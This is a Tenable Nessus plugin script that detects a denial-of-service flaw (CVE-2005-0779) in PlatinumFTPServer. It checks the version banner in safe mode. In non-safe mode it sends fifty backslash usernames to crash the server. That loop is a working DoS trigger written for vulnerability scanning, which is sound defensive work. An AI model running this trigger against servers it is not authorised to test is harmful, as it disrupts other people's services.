#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(17321);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2005-0779");
  script_bugtraq_id(12790);
  script_osvdb_id(3217);

  script_name(english:"PlatinumFTPServer username Multiple Connection Handling Remote Format String");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is susceptible to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The installed version of PlatinumFTPserver on the remote host suffers
from a denial of service vulnerability.  Specifically, when a user
tries to login with a username containing a backslash, '\', the
application displays a dialog box and stops the login process until an
administrator acknowledges a message.  After several such connection
attempts, the ftp server daemon reportedly crashes." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/393038" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");


 script_set_attribute(attribute:"plugin_publication_date", value: "2005/03/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/12/24");
 script_cvs_date("$Date: 2011/03/11 20:33:09 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

  script_summary(english:"Checks for multiple malformed username connection denial of service vulnerability in PlatinumFTPServer");
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
  script_dependencie("ftpserver_detect_type_nd_version.nasl");
  script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
  script_require_ports("Services/ftp", 21);
  exit(0);
}

include("ftp_func.inc");


port = get_ftp_port(default: 21);

# Get the banner and make sure it looks like an FTP server.
banner = get_ftp_banner(port:port);
if (
  !banner || 
  !egrep(string:banner, pattern:"^220[ -]") ||
  "Platinum" >!< banner
) exit(0);


# Check for vulnerability.
if (safe_checks()) {
  # According to the advisory, version 1.0.18 and maybe lower are affected.
  #
  # nb: PlatinumFTPserver allows the admin to change the banner.
  if (egrep(string:banner, pattern:"^220-PlatinumFTPserver V(0\..*|1\.0\.([1-9]|1[0-8]))[^0-9.]")) {
    w = strcat(
      'Nessus has determined the vulnerability exists on the target simply\n',
      'by looking at the version number of PlatinumFTPserver installed\n',
      'there.\n'
    );
    security_warning(port:port, extra: w);
  }
}
else {
  # Try up to 50 times to log in.
  max = 50;
  for (i=1; i<=max; i++) {
    soc = open_sock_tcp(port);
    if (soc) {
      # Keep track of socket for later.
      sockets[i] = soc;
      req = 'USER \\\r\n';
      send(socket:soc, data:req);
    }
    # If we can't open the socket, there's a problem.
    else {
      security_warning(port);
      exit(0);
    }
    # nb: prevents false positives.
    sleep(1);
  }
  # Release any opened sockets.
  for (i=1; i<=max; i++) {
    if (sockets[i]) close(sockets[i]);
  }
}
